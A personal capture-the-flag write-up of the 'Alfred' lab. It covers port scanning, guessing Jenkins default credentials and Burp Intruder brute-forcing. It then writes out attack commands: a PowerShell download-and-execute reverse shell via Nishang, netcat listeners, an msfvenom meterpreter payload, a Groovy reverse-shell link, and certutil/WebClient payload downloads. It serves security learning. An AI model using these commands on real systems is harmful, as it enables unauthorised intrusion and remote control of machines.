# Alfred
Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. 

# Task 1 Initial Access:

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using Nishang(opens in new tab) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts(opens in new tab).

```
git clone https://github.com/samratashok/nishang
```

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

### NMAP scan (no ping Pn): 
```
# nmap -sT -sC <targetIP>
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-03 17:40 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 4.36 seconds
root@ip-<attackerIP> :~# nmap -sT -Pn -sC <targetIP>
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-03 17:41 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for  <targetIP>
Host is up (0.00047s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server
|_ssl-date: 2026-04-03T16:41:18+00:00; 0s from scanner time.
8080/tcp open  http-proxy
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).

Nmap done: 1 IP address (1 host up) scanned in 65.28 seconds
# curl http:// <targetIP>:8080/robots.txt
# we don't want robots to click "build" links
User-agent: *

```
## Q1: number of TCP ports:
Answer: 3

Trying several things, looking at code in url pages, basic gobuster scan of directories, and exiftools not a lot showed up. Only
alfred@wayneenterprises.com visible on the main page, the <target-ip>:8080 showed image of jenkins but could not be saved. In the code there was a reference to j_acegi_security_check.


It’s a tell‑tale sign of an old Java web application using Acegi Security, which is the predecessor of Spring Security. When you see this string in a login form or request, it indicates:

acegi refers to Acegi Security, which was the original name of Spring Security, the Java security framework used in many older web applications.

### The application is using old Spring Security (pre‑2008)
- The login form is posting to the default Acegi authentication endpoint.
- The app is likely running on Java / Tomcat / JSP.
- It may be vulnerable depending on how outdated the framework is.

## Q2 What is the username and password for the login panel? (in the format username:password):

Considering the answer expected is *****:*****, with consideration of the names found on the site and common names you would expect with wayne, bruce and admin, were likely expected to be one of options, password I considerd common list i decided not to try a common wordlist as these were enough to guess it. No need for brute force.  

Answer: Only admin:admin are successful.

Just to keep fresh with burpe here is a basic example of cluster bomb approach for multiple unkowns or sniper if only one variable unknown:
- Set up proxy in browser like foxy proxy. Turn intercept on in proxy configuration on burpse suite.
- Fill user name and password box with easily identifiable locators, the select "sign in".
- That is captured in burpe suite check the login details are listed and forward to intruder.
- Use cluster bomb not sniper mode as more than one variable and assign wordlists to each variable then start attack.
- The output will all be status code 302, but the headers are what vary. 

Unsuccessful (admin:wayne)
```
HTTP/1.1 302 Found
Date: Sun, 05 Apr 2026 11:42:40 GMT
X-Content-Type-Options: nosniff
Set-Cookie: JSESSIONID.a7acbf59=node0culm1u2k46xraz96yxi7hhci19.node0;Path=/;HttpOnly
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE=;Path=/;Expires=Thu, 01-Jan-1970 00:00:00 GMT;Max-Age=0;HttpOnly
Location: http://<targetIP>:8080/loginError
Content-Length: 0
Server: Jetty(9.4.z-SNAPSHOT
```
Successful (admin:admin)
```
HTTP/1.1 302 Found
Date: Sun, 05 Apr 2026 11:42:46 GMT
X-Content-Type-Options: nosniff
Set-Cookie: JSESSIONID.a7acbf59=node01m7pxm70badb17albaatsn8v23.node0;Path=/;HttpOnly
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Location: http://<targetIP>:8080/
Content-Length: 0
Server: Jetty(9.4.z-SNAPSHOT)
```
It was also worth considering some applications with java used to have password hardcoded into the applications. so it was worth looking at gobuster to check what folders or files could be enumerated. No real luck  the two files with status code 200 the reset.

You can filter further using:
1. In Intruder → Options
2. Scroll to Grep – Extract
3. Click Add
4. In the response preview, highlight the Location header
(Burp will auto‑fill the regex)
5. Save

Now your Intruder results table will show a new column like:

Payload	        Status	    Extracted
admin:wayne	    302	        /loginError
admin:admin	    302	        /

```
gobuster dir -u http://TARGET-IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -x php,txt,html -e -k

wordlist 800,000 long, target slows down never completing even with t 10, t 1 might work but target would time out. This was as good as it got. 

gobuster dir -u http://<targetIP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html -e -k --status-codes-blacklist 404,403,302,301>out5.txt


# cat out3.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<targetIP>:8080
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   403,302,301,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://<targetIP>:8080/robots.txt           (Status: 200) [Size: 71]
http://<targetIP>:8080/login                (Status: 200) [Size: 1942]
http://<targetIP>:8080/oops                 (Status: 500) [Size: 9389]
http://<targetIP>:8080/j_security_check     (Status: 303) [Size: 0] [--> http://<targetIP>:8080/loginError]

===============================================================
Finished

nothing really usable. 
```



Q4: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```
You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
Answer: no response required.

This requires the use of Nishang tool kit mentioned earlier. 
Download, go to shells folder and start a python3 htt.server to allow download from server end.
```
root@ip-10-49-76-50:~# git clone https://github.com/samratashok/nishang
Cloning into 'nishang'...
...
~# cd nishang/Shells
~/nishang/Shells# ls
Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
Invoke-PowerShellTcpOneLine.ps1

:~/nishang/Shells# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<targetIP> - - [05/Apr/2026 13:03:02] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

File downloaded successfully.
```
```
~/nishang/Shells# nc -lnvp 4443
Listening on 0.0.0.0 4443
Connection received on <targetIP> 49370
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue

    Directory: C:\Users\bruce\Desktop

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          

PS C:\Program Files (x86)\Jenkins\workspace\project> type c:\users\bruce\desktop\user.txt
79007a09481963edf2e1321abd9ae2a0
PS C:\Program Files (x86)\Jenkins\workspace\project> 

```

Another alternative was to use the “Manage Jenkins” option and then open the Script Console, where a Groovy script, a language somewhere between Java and Python, which is required by script window. A reverse shell example can be found in online resources, allowing a connection in a more simplified way compared to using the Nishang toolkit. After selecting Run, it will connect back to your netcat listener. I will connect back to a regular windows command line. but can be changed to powershell easy enough if required.


# Task 2: Switching shells

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```
So starters quick reverse shell back in using groovy instead it appears easier, here is one link for a classic groovy reverse shell:
```
https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
```
Its the same as reverse shell rom revshells.com, except String cmd="sh" is String cmd="cmd.exe" and of course change ip and port as normal.

This reverse‑shell method seemed to crash when I tried transitioning to PowerShell—just using that word caused the session to break. From that point, certutil was the best option for transferring a file. However, when using the VPN, the target at IP:8080 was reachable until a password was entered. Because of that, I had to use the attack box directly.

This created a new issue: port 80 was no longer usable, which meant I couldn’t rely on python3 -m http.server 80. The environment did allow port 443, though.
```
certutil.exe -urlcache -split -f http://<targetIP>/shell-name.exe shell-name.exe
or just
```

.I also tried using copy, but CMD doesn’t support copying via port numbers because it relies on SMB. According to Nmap, SMB wasn’t available on the target, and even if it had been, the copy \\IP\file method still wouldn’t have worked because SMB doesn’t allow specifying ports in UNC paths. It only operates over ports 445 or 139 when those services are running. Since neither port was open, copy was never a viable option.
```
copy //ip/folder/file file
```

Using the PowerShell command from a CMD shell didn’t work either:
```
powershell -command "Invoke-WebRequest -Uri http://<attackerIP>:8000/shell-name.exe -OutFile shell-name.exe"
```
In theory this should have worked as long as PowerShell was available and allowed to make outbound web requests, but in this environment it failed. 

I wondered why this would fail here are a few reason it might fail:
- Execution policy restrictions
- But Invoke-WebRequest is disabled or restricted on many Windows systems
- PowerShell 2.0 being used instead of 5+
- Missing TLS support
- Network restrictions
- SmartScreen / Defender blocking the download
- Corporate policy disabling web requests

## So here I am back to nishang for this task.

reset the reverse shell. 
- Uploaded new payload with python3 -m http.server.
- Downloadto using:
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<attackerIP>:8000/shell-name.exe','shell-name.exe')"
```
